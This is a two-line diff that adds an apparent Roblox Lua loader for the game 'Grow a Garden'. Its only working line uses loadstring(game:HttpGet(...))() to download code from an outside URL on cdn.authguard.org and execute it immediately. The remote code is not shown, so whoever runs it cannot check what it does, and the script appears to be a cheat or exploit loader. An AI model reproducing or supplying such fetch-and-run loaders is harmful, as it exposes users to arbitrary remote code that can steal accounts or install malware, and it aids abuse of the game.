@@ -1,0 +1,2 @@
+-- grow a garden 
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/63f8c8d4b363486f92b6a8c97f85ba76"))()
